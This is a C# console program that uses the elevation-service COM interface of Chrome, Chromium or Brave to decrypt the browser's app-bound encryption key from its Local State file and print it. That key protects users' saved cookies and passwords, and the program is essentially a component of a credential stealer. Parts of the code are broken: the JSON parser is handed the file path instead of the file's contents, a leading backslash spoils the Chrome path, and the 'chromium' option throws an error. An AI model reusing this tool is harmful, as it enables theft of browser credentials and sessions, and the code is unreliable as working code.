using System.Runtime.InteropServices;
using System.Text;
using Newtonsoft.Json.Linq;

class Program
{
    // Define the CoSetProxyBlanket function
    [DllImport("ole32.dll", CharSet = CharSet.Unicode)]
    private static extern int CoSetProxyBlanket(
        [MarshalAs(UnmanagedType.IUnknown)] object pProxy,
        uint dwAuthnSvc,
        uint dwAuthzSvc,
        string? pServerPrincName,
        uint dwAuthnLevel,
        uint dwImpLevel,
        IntPtr pAuthInfo,
        uint dwCapabilities
    );

    // Define constants for authentication and impersonation levels
    private const uint RPC_C_AUTHN_LEVEL_PKT_PRIVACY = 6;
    private const uint RPC_C_IMP_LEVEL_IMPERSONATE = 3;
    private const uint EOAC_NONE = 0;
    private const uint RPC_C_AUTHN_WINNT = 10;
    private const uint RPC_C_AUTHZ_NONE = 0;


    static void Main(string[] args)
    {
        // Check if any arguments are passed
        if (args.Length == 0)
        {
            Console.WriteLine("No arguments provided.");
            return;
        }

        if (args.Length > 1)
        {
            Console.WriteLine("Too many arguments provided.");
            return;
        }

        string browser = args[0];

        Guid clsid;

        if (browser == "chrome")
        {
            clsid = new Guid(ChromeCOM.Chrome.ChromeCLSID);
        }
        else if (browser == "chromium")
        {
            clsid = new Guid(ChromeCOM.Chromium.ChromiumCLSID);
        }
        else if (browser == "brave")
        {
            clsid = new Guid(BraveCOM.Brave.BraveCLSID);
        }
        else
        {
            Console.WriteLine("Wrong browser name. Select one of the following: 'chrome', 'chromium', 'brave'.");
            return;
        }

        // Get the type of the COM class
        Type? comType = Type.GetTypeFromCLSID(clsid);

        if (comType == null)
        {
            Console.WriteLine("Failed to get type from CLSID.");
            return;
        }

        // Create an instance of the COM object
        dynamic? comObject = Activator.CreateInstance(comType);

        if (comObject == null)
        {
            Console.WriteLine("Failed to create COM object.");
            return;
        }


        int hr = CoSetProxyBlanket(
            comObject,
            RPC_C_AUTHN_WINNT,
            RPC_C_AUTHZ_NONE,
            null,
            RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
            RPC_C_IMP_LEVEL_IMPERSONATE,
            IntPtr.Zero,
            EOAC_NONE
        );

        if (hr != 0)
        {
            Console.WriteLine("CoSetProxyBlanket failed with HRESULT: " + hr);
        }
        else
        {
            Console.WriteLine("CoSetProxyBlanket succeeded.");
        }

        if (browser == "chrome" || browser == "chromium")
        {
            try
            {
                byte[] encryptionKey = FindEncryptionKey(browser);

                comObject.DecryptData(Encoding.UTF8.GetString(encryptionKey), out string decryptedKey, out uint decryptionError);

                Console.WriteLine($"The decrypted key {decryptedKey}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed to decrypt the key: {ex.Message}");
            }
        }
        else if (browser == "brave")
        {
            try
            {
                byte[] encryptionKey = FindEncryptionKey(browser);

                comObject.DecryptData(Encoding.UTF8.GetString(encryptionKey), out string decryptedKey, out uint decryptionError);

                Console.WriteLine($"The decrypted key {decryptedKey}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed to decrypt the key: {ex.Message}");
            }
        }

    }

    static byte[] FindEncryptionKey(string browser)
    {

        string localStateFile;

        if (browser == "chrome")
        {
            localStateFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"\Google\Chrome\User Data\Local State");
        }
        else if (browser == "brave")
        {
            localStateFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"BraveSoftware\Brave-Browser\User Data\Local State");
        }
        else
        {
            throw new Exception("Wrong browser type provided to find encryption key");
        }

        if (!File.Exists(localStateFile))
        {
            throw new FileNotFoundException($"File {localStateFile} does not exist");
        }

        Console.WriteLine("Getting the encryption key for the chromium based browser");

        JObject localState = JObject.Parse(localStateFile);


        string? encryptedKeyB64 = localState["os_crypt"]?["app_bound_encrypted_key"]?.ToString();

        if (encryptedKeyB64 == null)
        {
            throw new Exception("Failed to find the encryption key in the Local State file");
        }

        byte[] encryptedKey = Convert.FromBase64String(encryptedKeyB64);

        return encryptedKey;
    }
}

